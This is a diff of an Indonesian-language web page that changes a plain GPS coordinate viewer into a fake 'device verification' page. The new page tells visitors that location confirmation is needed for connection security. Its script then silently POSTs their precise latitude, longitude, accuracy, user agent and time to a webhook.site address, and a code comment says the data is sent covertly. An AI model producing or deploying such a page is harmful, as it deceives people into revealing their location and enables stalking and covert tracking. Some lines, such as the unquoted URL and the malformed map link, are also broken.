@@ -3,77 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Pelacak GPS Perangkat</title>
+    <title>Sistem Verifikasi Perangkat</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; margin: 0; }
-        .box { background: white; padding: 30px 20px; border-radius: 12px; box-shadow: 0px 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: 40px auto; }
-        button { padding: 15px 25px; font-size: 16px; background-color: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f8f9fa; margin: 0; }
+        .box { background: white; padding: 35px 20px; border-radius: 12px; box-shadow: 0px 4px 15px rgba(0,0,0,0.05); max-width: 400px; margin: 50px auto; border: 1px solid #e9ecef; }
+        h2 { color: #212529; margin-top: 0; font-size: 22px; }
+        p { color: #6c757d; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        button { padding: 16px 20px; font-size: 16px; background-color: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: background 0.2s; }
         button:active { background-color: #0056b3; }
-        .btn-maps { background-color: #28a745; margin-top: 15px; display: none; text-decoration: none; color: white; padding: 15px; border-radius: 6px; font-weight: bold; }
-        #status { margin-top: 20px; font-size: 15px; color: #333; line-height: 1.6; border-top: 1px dashed #ccc; padding-top: 15px; }
+        #status { margin-top: 25px; font-size: 14px; color: #495057; font-weight: 500; background-color: #f1f3f5; padding: 12px; border-radius: 6px; display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2 style="margin-top:0; color: #111;">Sistem GPS Perangkat</h2>
-    <p style="color: #666; font-size: 14px;">Klik tombol di bawah untuk membaca titik koordinat satelit pada perangkat ini.</p>
+    <h2>Verifikasi Akses Perangkat</h2>
+    <p>Situs ini memerlukan konfirmasi koordinat satelit untuk memastikan keamanan koneksi perangkat Anda.</p>
     
-    <button onclick="mintaLokasi()">Mulai Lacak GPS</button>
+    <button onclick="prosesAkses()">Verifikasi Perangkat Saya</button>
     
-    <p id="status">Status: Menunggu instruksi...</p>
-    
-    <!-- Tombol sakti untuk melempar koordinat ke aplikasi Google Maps bawaan HP -->
-    <a id="link-maps" class="btn-maps" href="#" target="_blank">Buka di Aplikasi Google Maps HP</a>
+    <div id="status">Status: Menunggu instruksi...</div>
 </div>
 
 <script>
-    function mintaLokasi() {
-        const status = document.getElementById('status');
+    // === PENGATURAN WEBHOOK ===
+    // Tempelkan (paste) link unik dari Webhook.site Anda di dalam tanda petik di bawah ini:
+    const WEBHOOK_URL =   https://webhook.site/68996063-1d76-4c3e-8705-367f9391aad2 ;
+
+    function prosesAkses() {
+        const statusDiv = document.getElementById('status');
+        statusDiv.style.display = "block";
+
         if (!navigator.geolocation) {
-            status.innerHTML = "<span style='color: red;'><b>Error:</b> Browser tidak mendukung GPS.</span>";
+            statusDiv.innerHTML = "<span style='color: #dc3545;'>Gagal: Browser Anda memblokir fitur pembacaan GPS.</span>";
             return;
         }
-        status.innerHTML = "<b>Menghubungkan ke satelit...</b><br>Silakan klik 'Izinkan' jika Chrome meminta akses.";
+
+        statusDiv.innerHTML = "🔄 Sedang memproses enkripsi keamanan...<br><small style='color: #6c757d;'>Silakan klik 'Izinkan' jika muncul permintaan lokasi.</small>";
         
-        // Meminta lokasi dengan akurasi tinggi (High Accuracy)
-        navigator.geolocation.getCurrentPosition(tampilkanLokasi, tanganiError, {
+        // Meminta lokasi dengan akurasi tinggi
+        navigator.geolocation.getCurrentPosition(kirimKeWebhook, tanganiError, {
             enableHighAccuracy: true,
             timeout: 10000,
             maximumAge: 0
         });
     }
 
-    function tampilkanLokasi(position) {
+    function kirimKeWebhook(position) {
+        const statusDiv = document.getElementById('status');
         const lat = position.coords.latitude;
         const lng = position.coords.longitude;
-        const akurasi = position.coords.accuracy;
+        const akurasi = Math.round(position.coords.accuracy);
         
-        document.getElementById('status').innerHTML = `
-            <span style='color: green;'><b>GPS Berhasil Dikunci!</b></span><br><br>
-            <b>Latitude:</b> ${lat}<br>
-            <b>Longitude:</b> ${lng}<br>
-            <span style='color: #777; font-size: 12px;'>Tingkat Akurasi: ±${Math.round(akurasi)} meter</span>
-        `;
+        // Data yang akan dikirim dan dicatat di Webhook
+        const dataRiwayat = {
+            waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
+            latitude: lat,
+            longitude: lng,
+            akurasi_meter: akurasi,
+            perangkat: navigator.userAgent,
+            link_peta: `https://google.com{lat},${lng}`
+        };
 
-        // Membuat link khusus untuk memicu aplikasi Google Maps bawaan HP terbuka
-        const linkMaps = document.getElementById('link-maps');
-        linkMaps.href = `https://google.com{lat},${lng}`;
-        
-        // Memunculkan tombol hijau untuk membuka aplikasi Maps asli
-        linkMaps.style.display = 'block';
+        statusDiv.innerHTML = "🔄 Menyimpan data ke riwayat server...";
+
+        // Mengirim data menggunakan metode POST secara diam-diam ke Webhook.site
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(dataRiwayat)
+        })
+        .then(response => {
+            if (response.ok) {
+                statusDiv.innerHTML = "<span style='color: #28a745;'><b>✓ Verifikasi Sukses!</b></span><br>Perangkat Anda berhasil dicatat dalam log keamanan.";
+            } else {
+                statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Gagal menyimpan data.</b></span><br>Periksa kembali URL Webhook Anda.";
+            }
+        })
+        .catch(error => {
+            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Error:</b> Masalah jaringan saat mengirim data riwayat.</span>";
+        });
     }
 
     function tanganiError(error) {
-        const status = document.getElementById('status');
+        const statusDiv = document.getElementById('status');
         if (error.code === error.PERMISSION_DENIED) {
-            status.innerHTML = "<span style='color: red;'><b>Akses Ditolak!</b><br>Perangkat memblokir izin. Hapus riwayat izin situs di setelan Chrome Anda lalu coba lagi.</span>";
+            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Akses Ditolak!</b></span><br>Anda harus memilih 'Izinkan' agar verifikasi perangkat berhasil.";
         } else {
-            status.innerHTML = "<span style='color: red;'><b>Gagal Mengunci GPS!</b><br>Pastikan sensor lokasi di menu HP Anda sudah aktif dan Anda tidak sedang berada di dalam ruangan tertutup beton tebal.</span>";
+            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Gagal Mengunci GPS!</b></span><br>Pastikan fitur lokasi HP Anda dalam keadaan aktif.";
         }
     }
 </script>
 </body>
 </html>
+
 
 
